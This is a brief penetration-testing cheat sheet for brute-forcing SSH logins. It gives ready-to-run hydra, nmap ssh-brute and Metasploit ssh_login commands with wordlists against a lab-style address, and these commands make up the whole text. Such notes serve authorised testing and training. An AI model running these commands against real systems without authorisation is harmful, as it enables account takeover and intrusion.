# Brute force
#### hydra
````bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.15 ssh
````
#### nmap
````bash
echo "administrator" > users
nmap -p 22 --script ssh-brute --script-args userdb=/root/users 10.0.2.15
````
#### Metasploit
````bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.2.15
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
exploit
````
